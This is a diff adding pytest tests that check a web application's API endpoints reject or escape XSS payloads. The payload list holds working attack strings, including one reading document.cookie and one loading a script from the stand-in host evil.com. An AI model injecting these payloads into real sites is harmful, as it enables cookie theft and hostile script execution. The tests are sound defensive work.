@@ -103,6 +103,328 @@ class TestCSRFProtection:
 class TestXSSProtection:
     """Test XSS protection measures"""
 
+    # =========================================================================
+    # XSS Payload Definitions for Parametrized Tests
+    # =========================================================================
+
+    # Core XSS payloads covering common attack vectors
+    XSS_PAYLOADS = [
+        # Basic script injection
+        "<script>alert('xss')</script>",
+        "<script>alert(String.fromCharCode(88,83,83))</script>",
+        # Event handlers
+        "<img src=x onerror=alert('xss')>",
+        "<svg/onload=alert('xss')>",
+        "<body onload=alert('xss')>",
+        # JavaScript URL schemes
+        "javascript:alert('xss')",
+        "javascript:alert(document.cookie)",
+        # Attribute escaping
+        "\" onclick=\"alert('xss')\" x=\"",
+        "' onclick='alert(1)' x='",
+        # Mixed case bypass attempts
+        "<ScRiPt>alert('xss')</ScRiPt>",
+        # External script loading
+        "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>",
+    ]
+
+    # Critical endpoints and their test configurations
+    # Format: (endpoint, method, field_name, json_template)
+    CRITICAL_USER_INPUT_ENDPOINTS = [
+        ("/api/feature-flags/toggle", "POST", "flag_name", {"flag_name": "{payload}", "enabled": True}),
+        ("/api/auth/aws-credentials", "POST", "access_key", {"access_key": "{payload}", "secret_key": "test", "environment": "com"}),
+        ("/api/scripts/", "POST", "name", {"name": "{payload}", "content": "echo test", "description": "Test", "script_type": "bash"}),
+        ("/api/scripts/", "POST", "description", {"name": "test", "content": "echo test", "description": "{payload}", "script_type": "bash"}),
+    ]
+
+    # =========================================================================
+    # Parametrized XSS Payload Tests
+    # =========================================================================
+
+    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
+    def test_xss_payload_in_feature_flag_name(self, client, payload):
+        """Test XSS payloads are blocked in feature flag name field
+
+        Validates that XSS payloads in the flag_name field are either:
+        1. Rejected with validation error (400, 422)
+        2. Sanitized before being included in responses
+        3. Not reflected in the response at all
+
+        If endpoint doesn't exist yet (404), test passes to allow development.
+        """
+        response = client.post(
+            "/api/feature-flags/toggle",
+            json={"flag_name": payload, "enabled": True}
+        )
+
+        if response.status_code == 404:
+            # Endpoint not yet implemented
+            pass
+        elif response.status_code == 200:
+            # If accepted, payload should be sanitized in response
+            response_text = response.text
+            assert payload not in response_text, (
+                f"XSS payload '{payload[:50]}...' reflected unescaped in response"
+            )
+        else:
+            # Validation rejection (400, 422, 403) is acceptable
+            assert response.status_code in [400, 422, 403], (
+                f"Unexpected status {response.status_code} for XSS payload"
+            )
+
+    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
+    def test_xss_payload_in_credentials_access_key(self, client, payload):
+        """Test XSS payloads are blocked in credentials access_key field
+
+        AWS credential fields should have strict validation that rejects
+        XSS payloads. Validates proper input validation is in place.
+        """
+        response = client.post(
+            "/api/auth/aws-credentials",
+            json={
+                "access_key": payload,
+                "secret_key": "test-secret-key",
+                "session_token": "test-token",
+                "environment": "com"
+            }
+        )
+
+        if response.status_code == 404:
+            # Endpoint not yet implemented
+            pass
+        elif response.status_code == 200:
+            # If accepted, verify payload not reflected unescaped
+            response_text = response.text
+            assert payload not in response_text, (
+                f"XSS payload in access_key reflected unescaped"
+            )
+        else:
+            # Validation rejection is expected and correct behavior
+            assert response.status_code in [400, 422, 403, 401], (
+                f"Unexpected status {response.status_code} for XSS in credentials"
+            )
+
+    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
+    def test_xss_payload_in_credentials_secret_key(self, client, payload):
+        """Test XSS payloads are blocked in credentials secret_key field"""
+        response = client.post(
+            "/api/auth/aws-credentials",
+            json={
+                "access_key": "AKIA1234567890EXAMPLE",
+                "secret_key": payload,
+                "session_token": "test-token",
+                "environment": "com"
+            }
+        )
+
+        if response.status_code == 404:
+            pass
+        elif response.status_code == 200:
+            assert payload not in response.text
+        else:
+            assert response.status_code in [400, 422, 403, 401]
+
+    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
+    def test_xss_payload_in_script_name(self, client, payload):
+        """Test XSS payloads are blocked in script name field
+
+        Script names are stored and displayed in the UI, making this
+        a critical XSS vector. Payloads must be rejected or sanitized.
+        """
+        response = client.post(
+            "/api/scripts/",
+            json={
+                "name": payload,
+                "content": "#!/bin/bash\necho 'test'",
+                "description": "Test script",
+                "script_type": "bash"
+            }
+        )
+
+        if response.status_code == 404:
+            # Scripts endpoint not implemented
+            pass
+        elif response.status_code in [200, 201]:
+            # If accepted, payload must be sanitized
+            response_text = response.text
+            assert payload not in response_text, (
+                f"XSS payload in script name reflected unescaped"
+            )
+        else:
+            # Validation rejection is acceptable
+            assert response.status_code in [400, 422, 403, 401]
+
+    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
+    def test_xss_payload_in_script_description(self, client, payload):
+        """Test XSS payloads are blocked in script description field
+
+        Script descriptions are displayed in the UI. XSS payloads
+        must be properly handled to prevent stored XSS attacks.
+        """
+        response = client.post(
+            "/api/scripts/",
+            json={
+                "name": "test-script",
+                "content": "#!/bin/bash\necho 'test'",
+                "description": payload,
+                "script_type": "bash"
+            }
+        )
+
+        if response.status_code == 404:
+            pass
+        elif response.status_code in [200, 201]:
+            assert payload not in response.text
+        else:
+            assert response.status_code in [400, 422, 403, 401]
+
+    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
+    def test_xss_payload_in_change_number(self, client, payload):
+        """Test XSS payloads are blocked in change number field
+
+        Change numbers are stored and displayed throughout the application.
+        This is a high-priority XSS vector.
+        """
+        response = client.post(
+            "/api/script-runner/changes/",
+            json={
+                "change_number": payload,
+                "description": "Test change",
+                "status": "pending",
+                "instances": []
+            }
+        )
+
+        if response.status_code == 404:
+            pass
+        elif response.status_code in [200, 201]:
+            assert payload not in response.text
+        else:
+            assert response.status_code in [400, 422, 403, 401]
+
+    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
+    def test_xss_payload_in_change_description(self, client, payload):
+        """Test XSS payloads are blocked in change description field"""
+        response = client.post(
+            "/api/script-runner/changes/",
+            json={
+                "change_number": "CHG0001234",
+                "description": payload,
+                "status": "pending",
+                "instances": []
+            }
+        )
+
+        if response.status_code == 404:
+            pass
+        elif response.status_code in [200, 201]:
+            assert payload not in response.text
+        else:
+            assert response.status_code in [400, 422, 403, 401]
+
+    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
+    def test_xss_payload_in_execution_parameters(self, client, payload):
+        """Test XSS payloads are blocked in execution parameters
+
+        Execution parameters are stored and may be displayed in logs
+        or execution results. XSS payloads must be handled safely.
+        """
+        response = client.post(
+            "/api/script-runner/executions/",
+            json={
+                "script_id": 1,
+                "instance_id": "i-1234567890abcdef0",
+                "parameters": {"user_input": payload}
+            }
+        )
+
+        if response.status_code == 404:
+            pass
+        elif response.status_code in [200, 201]:
+            assert payload not in response.text
+        else:
+            assert response.status_code in [400, 422, 403, 401]
+
+    # =========================================================================
+    # Comprehensive Multi-Field XSS Tests
+    # =========================================================================
+
+    def test_xss_payloads_blocked_across_all_fields(self, client, security_test_payloads):
+        """Test that XSS payloads from fixture are blocked across endpoints
+
+        Uses the security_test_payloads fixture from conftest.py to test
+        multiple XSS payloads across various endpoints.
+        """
+        xss_payloads = security_test_payloads.get("xss_payloads", [])
+
+        for payload in xss_payloads:
+            # Test feature flags endpoint
+            response = client.post(
+                "/api/feature-flags/toggle",
+                json={"flag_name": payload, "enabled": True}
+            )
+            if response.status_code not in [404]:
+                assert payload not in response.text, (
+                    f"XSS payload '{payload}' found in feature-flags response"
+                )
+
+    def test_reflected_xss_in_query_parameters(self, client):
+        """Test XSS payloads in query parameters are not reflected
+
+        Query parameters in search or filter endpoints should not
+        be reflected unescaped in error messages or responses.
+        """
+        xss_payloads = [
+            "<script>alert(1)</script>",
+            "<img src=x onerror=alert(1)>",
+            "javascript:alert(1)",
+        ]
+
+        test_endpoints = [
+            "/api/scripts/?search={payload}",
+            "/api/script-runner/changes/?change_number={payload}",
+            "/api/script-runner/executions/?status={payload}",
+        ]
+
+        for endpoint_template in test_endpoints:
+            for payload in xss_payloads:
+                endpoint = endpoint_template.format(payload=payload)
+                response = client.get(endpoint)
+
+                if response.status_code not in [404, 405]:
+                    # Payload should not appear unescaped in response
+                    assert payload not in response.text, (
+                        f"XSS payload reflected in query param for {endpoint}"
+                    )
+
+    def test_xss_in_path_parameters_error_messages(self, client):
+        """Test XSS payloads in path parameters are escaped in errors
+
+        Path parameters with invalid values may be reflected in error
+        messages. Ensure proper escaping.
+        """
+        xss_payload = "<script>alert('path-xss')</script>"
+
+        endpoints_with_path_params = [
+            f"/api/scripts/{xss_payload}",
+            f"/api/feature-flags/{xss_payload}",
+            f"/api/script-runner/changes/{xss_payload}",
+        ]
+
+        for endpoint in endpoints_with_path_params:
+            response = client.get(endpoint)
+
+            # Even in error responses, payload should be escaped
+            if xss_payload in response.text:
+                # Check if it's properly escaped
+                assert "&lt;script&gt;" in response.text or xss_payload not in response.text, (
+                    f"XSS payload in path param unescaped at {endpoint}"
+                )
+
+    # =========================================================================
+    # Existing Tests (Preserved)
+    # =========================================================================
+
     def test_content_security_policy_headers(self, client):
         """Test Content Security Policy headers are set
 
